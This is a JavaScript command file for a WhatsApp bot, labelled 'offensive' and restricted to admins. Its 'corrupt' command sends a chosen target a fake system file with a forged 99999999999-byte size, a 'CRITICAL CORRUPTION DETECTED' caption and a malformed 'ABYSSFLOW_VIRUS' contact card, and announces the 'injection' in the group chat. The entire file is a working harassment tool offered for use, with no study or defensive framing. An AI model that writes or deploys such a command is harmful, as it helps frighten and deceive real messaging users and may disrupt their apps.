const { log } = require('../utils/logger');

module.exports = {
    name: 'corrupt',
    description: '🧊 Metadata Disruption: Sends malicious/glitched files to the target to simulate data corruption.',
    category: 'offensive',
    isAdmin: true,
    isOwner: true,
    async execute({ sock, chatId, message, args, bot }) {
        try {
            const target = message.message?.extendedTextMessage?.contextInfo?.participant ||
                (args[0] ? args[0].replace('@', '') + '@s.whatsapp.net' : chatId);

            await sock.sendMessage(chatId, { text: `🧊 *INJECTION DE DONNÉES CORROMPUES* sur @${target.split('@')[0]}...`, mentions: [target] });

            // Sending a malformed document
            await sock.sendMessage(target, {
                document: Buffer.from("CORRUPTED_FILE_DATA_BY_ABYSSFLOW"),
                fileName: "☠️ system_core_integrity.sys",
                mimetype: "application/octet-stream",
                fileLength: 99999999999, // Fake massive size
                caption: "⚠️ *CRITICAL CORRUPTION DETECTED*"
            });

            // Sending a "dead" VCard
            const vCard = 'BEGIN:VCARD\n' +
                'VERSION:3.0\n' +
                'FN:☠️ CORRUPTED BY ABYSSFLOW\n' +
                'TEL;type=CELL;type=VOICE;waid=00000000000:00000000000\n' +
                'END:VCARD';

            await sock.sendMessage(target, {
                contacts: {
                    displayName: "☠️ ABYSSFLOW_VIRUS",
                    contacts: [{ vcard: vCard }]
                }
            });

        } catch (error) {
            log.error('Error in CORRUPT command:', error);
            await sock.sendMessage(chatId, { text: '❌ Échec de la corruption.' });
        }
    }
};
